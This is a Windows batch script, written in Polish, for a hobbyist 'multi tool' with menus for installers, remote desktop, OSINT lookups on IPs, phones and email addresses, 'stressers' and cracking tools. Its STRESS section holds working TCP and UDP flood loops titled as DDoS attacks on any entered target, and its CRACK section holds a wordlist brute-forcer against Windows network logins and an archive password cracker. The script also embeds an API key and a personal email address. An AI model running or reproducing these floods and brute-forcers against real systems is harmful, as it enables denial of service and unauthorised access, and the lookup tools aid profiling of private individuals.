@echo off
Title Login
color c
setlocal enabledelayedexpansion

set "expected_key=goat"
set "cooldown=5"

set /p "input_key=Enter Key: "

if "%input_key%"=="%expected_key%" (
    echo Correct key entered. Access granted.
    
for /L %%i in (%cooldown%,-1,1) do (
    cls 
    echo Prosze zaczekaj %%i sekund zanim przejdziesz dalej...
    timeout /t 1 /nobreak >nul
    )

    goto Banner
) else (
    echo Wrong key entered. Access Denied.
    pause
    exit
)




:Banner
chcp 65001 >nul
Title Witaj
cls
echo --------------------------------------------------------------------------------------------------------------
echo [91m██████╗ ██████╗ ██╗         ███╗   ███╗██╗   ██╗██╗  ████████╗██╗    ████████╗ ██████╗  ██████╗ ██╗         ██████╗     ██████╗ [0m
echo [95m██╔══██╗██╔══██╗██║         ████╗ ████║██║   ██║██║  ╚══██╔══╝██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║         ╚════██╗   ██╔═████╗[0m
echo [35m██████╔╝██████╔╝██║         ██╔████╔██║██║   ██║██║     ██║   ██║       ██║   ██║   ██║██║   ██║██║          █████╔╝   ██║██╔██║[0m
echo [94m██╔══██╗██╔═══╝ ██║         ██║╚██╔╝██║██║   ██║██║     ██║   ██║       ██║   ██║   ██║██║   ██║██║          ╚═══██╗   ████╔╝██║[0m
echo [34m██████╔╝██║     ███████╗    ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║       ██║   ╚██████╔╝╚██████╔╝███████╗    ██████╔╝██╗╚██████╔╝[0m
echo [36m╚═════╝ ╚═╝     ╚══════╝    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝ ╚═════╝[0m
echo --------------------------------------------------------------------------------------------------------------
echo.
echo Czy chcesz przejść do multi toola?
echo 1. Tak
echo 2. Nie
set /p przejdz=Wybierz:

if "%przejdz%"=="1" goto START 
if "%przejdz%"=="2" goto EXIT



:START
cls
@echo off
chcp 65001 >nul
Title Welcome In Bpl's Multi Tool
color 0A
echo ╔════════════════════════════════════════════════════════════════════╗
echo ║                                                                    ║
echo ║ ┍━━━━━━━━━━━━━━━━ ☽【❖ Bpl's Tool ❖】☾ ━━━━━━━━━━━━━━━━━┑          ║
echo ║ (01). Zainstaluj Inne Programy                                     ║
echo ║ (02). Informacje o programie                                       ║
echo ║ (03). Zdalne łaczenie z komputerem                                 ║
echo ║ (04). OSINT - narzędzia analizy IP/domeny                          ║
echo ║ (05). Stress                                                       ║
echo ║ (06). Narzędzia Crackujące                                         ║
echo ║ (07). Wyjście                                                      ║
echo ╚════════════════════════════════════════════════════════════════════╝                                                                                                               
echo                          Witaj %USERNAME%
set /p wybieram=User:
if "%wybieram%"=="1" goto FILES
if "%wybieram%"=="2" goto INFO
if "%wybieram%"=="3" goto RDP
if "%wybieram%"=="4" goto OSINTMENU
if "%wybieram%"=="5" goto STRESS
if "%wybieram%"=="6" goto CRACK
if "%wybieram%"=="7" goto EXIT
goto START

:FILES
cd D:\Narzędzie Bpla\Bpl tool v3.0\PlikiNarzedzia

echo -----------------------------
echo 1. Zainstaluj Process Hacker 2
echo 2. Zainstaluj Wireshark
echo 3. Zainstaluj VirtualBox
echo 4. Zainstaluj Putty
echo 5. Zainstaluj Python
echo 6. Zainstaluj Google 
echo 7. Wróć do menu głównego
echo -----------------------------
set /p input=User:%BS%
if /i %input% EQU 1 start ph2.exe
if /i %input% EQU 2 start ws.exe
if /i %input% EQU 3 start VB.exe
if /i %input% EQU 4 start putty.msi
if /i %input% EQU 5 start python.exe
if /i %input% EQU 6 start Google.exe
if /i %input% EQU 7 goto START



:INFO
cls
echo ======================================
echo Program zostal stworzony przez Bpla :)
echo Wersja: 3.0
echo Kontakt e-mail: zefir.lipski@gmail.com
echo ======================================
pause
goto START

:RDP
cls
echo ===============================
echo POLACZENIE PRZEZ PULPIT ZDALNY
echo ===============================
set /p "ip=Podaj adres IP lub nazwe hosta: "
set /p "rdpuser=Podaj nazwe uzytkownika (np. NAZWAKOMPUTERA\user): "


set "rdpfile=%temp%\_polaczenie_zdalne.rdp"
echo full address:s:%ip% > "%rdpfile%"
echo username:s:%rdpuser% >> "%rdpfile%"

echo.
echo Laczenie z %ip% jako %rdpuser%...
mstsc "%rdpfile%"

echo.
choice /m "Czy chcesz polaczyc sie z innym komputerem?"
if errorlevel 2 goto START
goto RDP

:OSINTMENU
cls
echo --- OSINT Menu ---
echo 1. Sprawdz IP
echo 2. NSLookup domeny
echo 3. Ping
echo 4. Traceroute
echo 5. Geolokalizacja IP
echo 6. Wyszukiwanie Google
echo 7. EXIF
echo 8. Phone Lookup
echo 9. E-mail na Telefon
echo 10. E-mail Lookup
echo 11. Powrot do menu glownego

set /p osint_choice=Wybor:

if "%osint_choice%"=="1" goto OSINT_IP
if "%osint_choice%"=="2" goto OSINT_NSLOOKUP
if "%osint_choice%"=="3" goto OSINT_PING
if "%osint_choice%"=="4" goto OSINT_TRACE
if "%osint_choice%"=="5" goto OSINT_GEOIP
if "%osint_choice%"=="6" goto OSINT_GOOGLE
if "%osint_choice%"=="7" goto EXIF
if "%osint_choice%"=="8" goto PHONE_LOOKUP
if "%osint_choice%"=="9" goto EMAIL_TO_PHONE
if "%osint_choice%"=="10" goto EMAIL_LOOKUP
if "%osint_choice%"=="11" goto START

:OSINT_IP
cls
echo Podaj IP lub zostaw puste, by sprawdzic swoje IP publiczne:
set /p ipinput=

if "%ipinput%"=="" (
    echo Pobieranie publicznego IP...
    powershell -Command "(Invoke-RestMethod -Uri 'https://ipinfo.io/ip').Trim()"
) else (
    echo Informacje o IP %ipinput%:
    powershell -Command "Invoke-RestMethod -Uri 'https://ipinfo.io/%ipinput%/json' | ConvertTo-Json -Depth 3"
)
pause
goto OSINTMENU

:OSINT_NSLOOKUP
cls
echo Podaj domene do sprawdzenia:
set /p domain=

echo nslookup dla %domain%:
nslookup %domain%
pause
goto OSINTMENU

:OSINT_PING
cls
title Ping Tool
chcp 65001 >nul
color 0A

:: === Pobranie adresu docelowego ===
set /p "target=Podaj adres IP lub domenę do pingowania: "

if "%target%"=="" (
    echo [!] Nie podano adresu.
    pause
    exit /b
)

echo.
echo [*] Pinguję: %target%
echo ------------------------------
ping %target%
echo ------------------------------

echo.
echo [*] Test ping zakończony.
echo Wracam do menu Osint za 5 sekund...
timeout /t 5 /nobreak >nul
goto OSINTMENU

:OSINT_TRACE
cls
echo Podaj adres lub IP do traceroute:
set /p traceaddr=

tracert %traceaddr%
pause
goto OSINTMENU


:OSINT_GEOIP
cls
echo Podaj IP do geolokalizacji:
set /p geoip=

powershell -Command ^
    "$geo=Invoke-RestMethod -Uri 'http://ip-api.com/json/%geoip%';" ^
    "Write-Output 'Miasto: ' + $geo.city;" ^
    "Write-Output 'Kraj: ' + $geo.country;" ^
    "Write-Output 'ISP: ' + $geo.isp;" ^
    "Write-Output 'Region: ' + $geo.regionName;" ^
    "Write-Output 'Kod pocztowy: ' + $geo.zip;"
pause
goto OSINTMENU


:OSINT_GOOGLE
cls
echo Podaj fraze do wyszukania w Google:
set /p query=

start "" "https://www.google.com/search?q=%query%"
goto OSINTMENU


:EXIF
cls
echo === WYCIAGANIE METADANYCH Z PLIKU ===
echo Podaj sciezke do pliku (np. zdjecie.jpg):
set /p file=

if not exist "%file%" (
    echo Plik nie istnieje!
    pause
    goto OSINTMENU
)


:: Sprawdzenie czy exiftool.exe jest dostepny
where exiftool.exe >nul 2>&1 || (
    echo Nie znaleziono exiftool.exe. Upewnij sie, ze jest w PATH lub w folderze skryptu.
    pause
    goto OSINTMENU
)

:: Wywolanie exiftool
exiftool.exe "%file%"

pause
goto OSINTMENU

:PHONE_LOOKUP
cls
echo === Phone Number Lookup ===
set /p phone=Podaj numer telefonu (w formacie +48123456789):

:: Tutaj podaj swój klucz API do numverify
set "API_KEY=cc9f56fa5545a0811087d5b88cc842cd"


echo Wysylam zapytanie...

curl -s "http://apilayer.net/api/validate?access_key=%API_KEY%&number=%phone%" > phone_response.json

:: Wyświetl odpowiedź (cały JSON) — do debugowania
echo Odpowiedz API:
type phone_response.json
echo.

pause
goto OSINTMENU

:EMAIL_TO_PHONE
@echo off
title Uruchamianie PhoneScraper
chcp 65001 >nul

:: === ŚCIEŻKI ===
set "BASE_DIR=%~dp0"
set "SCRIPT_DIR=%BASE_DIR%python_scripts\phonescraper"
set "CHROMEDRIVER_URL=https://storage.googleapis.com/chrome-for-testing-public/120.0.6099.109/win32/chromedriver-win32.zip"
set "ZIP_FILE=%SCRIPT_DIR%\chromedriver.zip"
set "CHROMEDRIVER_EXE=%SCRIPT_DIR%\chromedriver-win32\chromedriver.exe"
set "REQUIREMENTS_FILE=%SCRIPT_DIR%\requirements.txt"
set "PYTHON_SCRIPT=%SCRIPT_DIR%\phonescraper.py"

:: === TWORZENIE FOLDERU (jeśli nie istnieje) ===
if not exist "%SCRIPT_DIR%" (
    mkdir "%SCRIPT_DIR%"
)

:: === POBIERANIE I ROZPAKOWANIE CHROMEDRIVERA ===
if exist "%CHROMEDRIVER_EXE%" (
    echo [*] ChromeDriver już istnieje. Pomijam pobieranie.
) else (
    echo [*] Pobieranie ChromeDriver...
    powershell -Command "Invoke-WebRequest -Uri '%CHROMEDRIVER_URL%' -OutFile '%ZIP_FILE%'"

    if exist "%ZIP_FILE%" (
        echo [*] Rozpakowywanie...
        powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%SCRIPT_DIR%' -Force"
        del "%ZIP_FILE%"
        echo [*] ChromeDriver zainstalowany w: %SCRIPT_DIR%
    ) else (
        echo [!] Błąd: Nie udało się pobrać pliku chromedriver.zip!
        pause
        exit /b
    )
)

:: === INSTALACJA REQUIREMENTS.TXT ===
if exist "%REQUIREMENTS_FILE%" (
    echo [*] Instalowanie zależności z requirements.txt...
    pip install -r "%REQUIREMENTS_FILE%"
) else (
    echo [!] Nie znaleziono pliku requirements.txt w: %REQUIREMENTS_FILE%
    pause
    exit /b
)

:: === URUCHOMIENIE SKRYPTU PYTHON ===
if exist "%PYTHON_SCRIPT%" (
    echo [*] Uruchamianie skryptu phonescraper.py...
    python "%PYTHON_SCRIPT%"
) else (
    echo [!] Skrypt phonescraper.py nie istnieje w: %PYTHON_SCRIPT%
    pause
    exit /b
)

pause

:EMAIL_LOOKUP
@echo off
title Email Lookup
chcp 65001 >nul
setlocal enabledelayedexpansion

:: === Pobierz adres email ===
set /p "email=Podaj adres email do wyszukania: "
if "%email%"=="" (
    echo [!] Nie podano adresu email.
    pause
    exit /b
)

:: === Tworzenie linków OSINT ===
set "duckduckgo=https://duckduckgo.com/?q=%email%"
set "google=https://www.google.com/search?q=%email%"
set "facebook=https://www.facebook.com/search/top?q=%email%"
set "linkedin=https://www.linkedin.com/search/results/all/?keywords=%email%"
set "haveibeenpwned=https://haveibeenpwned.com/unifiedsearch/%email%"
set "hunter=https://hunter.io/email-finder/%email%"
set "emailrep=https://emailrep.io/%email%"

:: === Wyświetlanie linków ===
echo.
echo [+] Oto linki OSINT dla: %email%
echo -----------------------------------------------
echo DuckDuckGo:       %duckduckgo%
echo Google:           %google%
echo Facebook:         %facebook%
echo LinkedIn:         %linkedin%
echo HaveIBeenPwned:   %haveibeenpwned%
echo Hunter.io:        %hunter%
echo EmailRep.io:      %emailrep%
echo -----------------------------------------------

:: === Otwieranie w przeglądarce ===
start "" "%duckduckgo%"
start "" "%google%"
start "" "%facebook%"
start "" "%linkedin%"
start "" "%haveibeenpwned%"
start "" "%hunter%"
start "" "%emailrep%"

echo.
echo [*] Linki zostały otwarte w domyślnej przeglądarce.
pause
exit /b




:STRESS
echo -----------------------------
echo       --- STRESSERS ---
echo -----------------------------
echo            Menu Wyborow
echo 1. nping (install Nmap)
echo 2. TCP
echo 3. UDP
echo 4. Wroc Do Menu Glownego
echo -----------------------------
set /p wybor1=Wybierz:

if "%wybor1%"=="1" goto NPINGPANEL
if "%wybor1%"=="2" goto TCP
if "%wybor1%"=="3" goto UDP
if "%wybor1%"=="4" goto START



:NPINGPANEL
cls
echo ---------------------------------
echo [1] Uruchom Bez instalacji
echo [2] Pobierz Nmap i uruchom nping
echo [3] Wyjscie
echo ---------------------------------
set /p wybornping=Wybierz: 

if "%wybornping%"=="1" goto NOINSTALL
if "%wybornping%"=="2" goto NPING
if "%wybornping%"=="3" exit




:NPING
@echo off
:: === SPRAWDZENIE ADMINISTRATORA ===
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Uruchamiam ponownie jako administrator...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

setlocal enabledelayedexpansion


:: === KONFIGURACJA ===
set "URL=https://nmap.org/dist/nmap-7.97-setup.exe"
set "FILENAME=nmap-7.97-setup.exe"
set "FOLDERNAME=Nmap"

:: === SZUKAJ DOSTĘPNEGO DYSKU ===
for %%D in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%D:\ (
        set "DEST_DRIVE=%%D:"
        goto FOUND
    )
)

echo Nie znaleziono dostepnego dysku. Przerywanie.
pause
exit /b

:FOUND
echo Znalazlem dysk: !DEST_DRIVE!

:: === USTAL FOLDER DOCELOWY ===
set "DEST_FOLDER=!DEST_DRIVE!\%FOLDERNAME%"

if not exist "!DEST_FOLDER!" (
    mkdir "!DEST_FOLDER!"
)

:: === POBIERANIE ===
echo Pobieram plik z:
echo %URL%
curl -L -o "!DEST_FOLDER!\%FILENAME%" "%URL%"

:: === SPRAWDZENIE ===
if exist "!DEST_FOLDER!\%FILENAME%" (
    echo Plik pobrany: !DEST_FOLDER!\%FILENAME%
) else (
    echo Blad pobierania. Przerywanie.
    pause
    exit /b
)

:: === INSTALACJA ===
echo Uruchamiam instalator...
start /wait "" "!DEST_FOLDER!\%FILENAME%" /S

echo Instalacja zakonczona.
pause


:NOINSTALL
set /p target=IP: 
set /p port=Port: 
set /p size=Rozmiar pakietu (np. 1000): 
set /p count=Liczba pakietow (np. 10000): 
start "" "nping.exe" --udp -p %port% --data-length %size% --count %count% %target%
goto STRESS

:TCP
title TCP Flood DDoS Script
color 0A

rem Input target IP or domain
set /p target=Enter target IP or domain: 

rem Input target port
set /p port=Enter target port: 

rem Input duration in seconds
set /p duration=Enter attack duration in seconds: 

rem Input number of threads (connections)
set /p threads=Enter number of parallel connections (recommended 100-500): 

echo Starting real TCP flood attack on %target%:%port% for %duration% seconds with %threads% threads...
timeout /t 2 /nobreak >nul

set /a endtime=%time:~0,2% * 3600 + %time:~3,2% * 60 + %time:~6,2% + %duration%

:attackloop
for /l %%i in (1,1,%threads%) do (
    start "" /B powershell -Command ^
    "$c = New-Object System.Net.Sockets.TcpClient; try {$c.Connect('%target%',%port%)} catch {}; $c.Close()"
)
rem Calculate current time in seconds
for /f "tokens=1-3 delims=:." %%a in ("%time%") do (
    set /a now=%%a*3600 + %%b*60 + %%c
)
if !now! LSS %endtime% (
    timeout /t 1 /nobreak >nul
    goto attackloop
)

echo Attack finished.
pause

:UDP 
title UDP Flood DDoS Script
color 0A

rem Input target IP or domain
set /p target=Enter target IP or domain: 

rem Input target port
set /p port=Enter target port: 

rem Input duration in seconds
set /p duration=Enter attack duration in seconds: 

rem Input packet size (bytes)
set /p size=Enter UDP packet size (recommended 512-1024): 

rem Input number of threads
set /p threads=Enter number of parallel threads (recommended 100-500): 

echo Starting UDP flood on %target%:%port% for %duration% seconds with packet size %size% and %threads% threads...
timeout /t 2 /nobreak >nul

set /a endtime=%time:~0,2% * 3600 + %time:~3,2% * 60 + %time:~6,2% + %duration%

:attackloop
for /l %%i in (1,1,%threads%) do (
    start "" /B powershell -Command ^
    "$udpclient = New-Object System.Net.Sockets.UdpClient; $bytes = New-Object byte[] %size%; (1..%size%) | ForEach-Object { $bytes[$_-1] = Get-Random -Minimum 0 -Maximum 255 }; try { $udpclient.Send($bytes, $bytes.Length, '%target%', %port%) } catch {}; $udpclient.Close()"
)
for /f "tokens=1-3 delims=:." %%a in ("%time%") do (
    set /a now=%%a*3600 + %%b*60 + %%c
)
if !now! LSS %endtime% (
    timeout /t 1 /nobreak >nul
    goto attackloop
)

echo UDP flood finished.
pause


:CRACK
@echo off
cls
title Narzedzia Crackujace
color A 
echo -------------------------------------
echo 1. Password Bruteforce
echo 2. WINRAR Bruteforce
echo 3. Wyjdz do menu glownego
echo -----------------------------------------
set /p cracktool=User:
if "%cracktool%"=="1" goto PASS 
if "%cracktool%"=="2" goto RAR
if "%cracktool%"=="3" goto START  



:PASS 

@echo off
title Skidded Bruteforce - by BplGames
color A
echo.
set /p ip="Wpisz Adres IP: "
set /p user="Wpisz Nazwe uzytkownika: "
set /p wordlist="Wpisz liste hasel: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Haslo nie znalezione :(
pause
goto CRACK

:success
echo.
echo Haslo znalezione! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto CRACK

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success



:RAR 
@echo off
title WINRAR Cracker
color 3
if not exist "C:\Program Files\7-Zip" (
	echo 7-Zip nie zainstalowane!
	pause
	goto CRACK
)

echo.
set /p archive="Wprowadz Archiwum (lub sciezke w ktorej jest): "
if not exist "%archive%" (
	echo Archiwum nie znalezione!
	pause
	goto CRACK
)

set /p wordlist="Wprowadz Liste (lub sciezke do Listy): "
if not exist "%wordlist%" (
	echo Lista Slownikowa nie znaleziona!
	pause
	goto CRACK
)
echo Crackowanie...
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)
echo Gowniana Lista Cymbale!
pause
goto CRACK

:attempt
"C:\Program Files\7-Zip\7z.exe" x -p%pass% "%archive%" -o"cracked" -y >nul 2>&1
echo ATTEMPT : %pass%
if /I %errorlevel% EQU 0 (
	echo Sukces! Haslo znalezione: %pass%
	pause
	goto CRACK
)



:EXIT
echo Dziekuje za skorzystanie z narzedzia.
timeout /t 2 /nobreak >nul
exit


